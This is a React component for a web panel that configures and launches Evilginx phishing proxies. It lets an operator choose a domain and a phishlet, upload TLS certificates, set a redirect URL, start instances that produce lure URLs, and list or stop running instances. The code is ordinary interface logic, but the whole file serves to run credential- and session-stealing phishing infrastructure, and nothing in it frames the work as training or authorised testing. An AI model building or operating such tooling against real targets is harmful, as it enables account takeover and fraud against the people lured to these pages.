import React, { useState, useEffect } from 'react';
import { API_ENDPOINTS, fetchApi } from '../api';
import CertbotModal from './CertbotModal';

function EvilginxSetup() {
  const [evilginxInstances, setEvilginxInstances] = useState([]);
  const [phishlets, setPhishlets] = useState([]);
  const [sessionInfo, setSessionInfo] = useState(null);
  const [domains, setDomains] = useState([]);
  const [formData, setFormData] = useState({
    domain: '',
    phishlet: '',
    ip: '',
    redirect_url: 'https://google.com'
  });
  const [loading, setLoading] = useState(true);
  const [phishletsLoading, setPhishletsLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });
  const [crtFile, setCrtFile] = useState(null);
  const [keyFile, setKeyFile] = useState(null);
  const [isCertUploaded, setIsCertUploaded] = useState(false);


  useEffect(() => {
    // Fetch existing Evilginx instances, phishlets, and domains
    fetchEvilginxInstances();
    fetchPhishlets();
    fetchDomains();
  }, []);

  const fetchEvilginxInstances = () => {
    setLoading(true);
    fetchApi(API_ENDPOINTS.evilginx.instances)
      .then(data => {
        if (data.status === 'success') {
          setEvilginxInstances(data.instances);
        }
        setLoading(false);
      })
      .catch(error => {
        console.error('Error fetching Evilginx instances:', error);
        setLoading(false);
      });
  };

  const fetchPhishlets = () => {
    setPhishletsLoading(true);
    fetchApi(API_ENDPOINTS.evilginx.phishlets)
      .then(data => {
        if (data.status === 'success') {
          setPhishlets(data.phishlets);
        }
        setPhishletsLoading(false);
      })
      .catch(error => {
        console.error('Error fetching phishlets:', error);
        setPhishletsLoading(false);
      });
  };

  const fetchDomains = () => {
    fetchApi(API_ENDPOINTS.domain.list)
      .then(data => {
        if (data.status === 'success') {
          setDomains(data.domains);
        }
      })
      .catch(error => {
        console.error('Error fetching domains:', error);
      });
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    fetchApi(API_ENDPOINTS.evilginx.setup, 'POST', formData)
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Evilginx instance started successfully!'
          });

          setSessionInfo({
            evilginx_id: data.evilginx_id,
            lure_url: data.lure_url,
            tmux_session: data.steps?.find(s => s.name === "run_evilginx")?.result?.tmux_session,
            phishlet: formData.phishlet
          });
          
          // Reset form
          setFormData({
            domain: '',
            phishlet: '',
            ip: '',
            redirect_url: 'https://google.com'
          });
          
          // Refresh instance list
          fetchEvilginxInstances();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to start Evilginx instance.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while starting Evilginx instance.'
        });
      });
  };

  const handleUploadCerts = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    setMessage({ type: '', text: '' });
  
    try {
      const certForm = new FormData();
      certForm.append("domain", formData.domain);
      certForm.append("phishlet", formData.phishlet);
      certForm.append("crt", crtFile);
      certForm.append("key", keyFile);
  
      const certUploadRes = await fetch(API_ENDPOINTS.evilginx.uploadCerts, {
        method: "POST",
        body: certForm
      }).then(res => res.json());
  
      if (certUploadRes.status === "success") {
        setIsCertUploaded(true);
        setMessage({ type: "success", text: "Certificates uploaded successfully!" });
        setTimeout(() => {
          setMessage({ type: '', text: '' });
        }, 3000);
      } else {
        throw new Error(certUploadRes.message || "Certificate upload failed.");
      }
  
    } catch (err) {
      setIsCertUploaded(false);
      setMessage({ type: "error", text: err.message });
    } finally {
      setSubmitting(false);
    }
  };
  

  const stopInstance = (instanceId) => {
    fetchApi(`${API_ENDPOINTS.evilginx.instances}/${instanceId}`, 'DELETE')
      .then(data => {
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Evilginx instance stopped successfully!'
          });
          setTimeout(() => {
            setMessage({ type: '', text: '' });
          }, 3000);
          
          fetchEvilginxInstances();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to stop Evilginx instance.'
          });
        }
      })
      .catch(error => {
        console.error('Error stopping instance:', error);
        setMessage({
          type: 'error',
          text: 'An error occurred while stopping the Evilginx instance.'
        });
      });
  };

  return (
    <div className="evilginx-setup">
      <h1>Evilginx Setup</h1>
      <p>Configure and launch Evilginx phishing proxies.</p>

      {/* Evilginx Setup Form */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Start New Evilginx Instance</h2>
        </div>
        
        {message.text && (
          <div className={`alert alert-${message.type}`}>
            {message.text}
          </div>
        )}
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="domain">Domain</label>
            <select
              id="domain"
              name="domain"
              value={formData.domain}
              onChange={handleChange}
              required
            >
              <option value="">-- Select Domain --</option>
              {domains.map((domain, index) => (
                <option key={index} value={domain.domain}>
                  {domain.domain}
                </option>
              ))}
            </select>
          </div>
          
          <div className="form-group">
            <label htmlFor="phishlet">Phishlet</label>
            {phishletsLoading ? (
              <div className="loading">
                <div className="loading-spinner"></div>
              </div>
            ) : (
              <select
                id="phishlet"
                name="phishlet"
                value={formData.phishlet}
                onChange={handleChange}
                required
              >
                <option value="">-- Select Phishlet --</option>
                {phishlets.map((phishlet, index) => (
                  <option key={index} value={phishlet}>
                    {phishlet}
                  </option>
                ))}
              </select>
            )}
          </div>
          
          <div className="form-group">
            <label htmlFor="ip">IP Address (Optional)</label>
            <input
              type="text"
              id="ip"
              name="ip"
              value={formData.ip}
              onChange={handleChange}
              placeholder="Leave blank to use server's public IP"
            />
          </div>
          
          <div className="form-group">
            <label htmlFor="redirect_url">Redirect URL</label>
            <input
              type="text"
              id="redirect_url"
              name="redirect_url"
              value={formData.redirect_url}
              onChange={handleChange}
              placeholder="e.g. https://google.com"
              required
            />
          </div>


          <CertbotModal domain={formData.domain} phishlet={formData.phishlet} />  
          <div className="form-group">
            <label>Certificate (.crt) File</label>
            <input type="file" accept=".crt" onChange={(e) => setCrtFile(e.target.files[0])} required />
          </div>

          <div className="form-group">
            <label>Key (.key) File</label>
            <input type="file" accept=".key" onChange={(e) => setKeyFile(e.target.files[0])} required />
          </div>

          
          {!isCertUploaded ? (
              <button
                type="button"
                className="btn"
                onClick={handleUploadCerts}
                disabled={submitting}
              >
                {submitting ? 'Uploading...' : 'Upload Certificates'}
              </button>
            ) : (
              <button
                type="submit"
                className="btn"
                disabled={submitting}
              >
                {submitting ? 'Starting...' : 'Start Evilginx'}
              </button>
            )}
        </form>

      </div>

      {/* Evilginx Instances List */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Running Evilginx Instances</h2>
        </div>
        
        {evilginxInstances.length === 0 ? (
            <p style={{ padding: '1rem' }}>No Evilginx instances running.</p>
          ) : (
            <ul style={{ listStyle: 'none', padding: '1rem' }}>
              {evilginxInstances.map((instance, index) => (
                <li key={instance.id || index} style={{ marginBottom: '1rem', borderBottom: '1px solid #ccc', paddingBottom: '10px' }}>
                  <p><strong>Phishlet:</strong> {instance.phishlet}</p>
                  <p><strong>Domain:</strong> {instance.domain}</p>
                  <p><strong>Lure URL:</strong> <a href={instance.lure_url} target="_blank" rel="noopener noreferrer">{instance.lure_url}</a></p>
                  <p><strong>IP:</strong> {instance.ip}</p>
                  <p><strong>Redirect URL:</strong> {instance.redirect_url}</p>
                  <button className="btn btn-danger" onClick={() => stopInstance(instance.id)}>Stop</button>
                </li>
              ))}
            </ul>
          )}

      </div>
    </div>
  );
}

export default EvilginxSetup;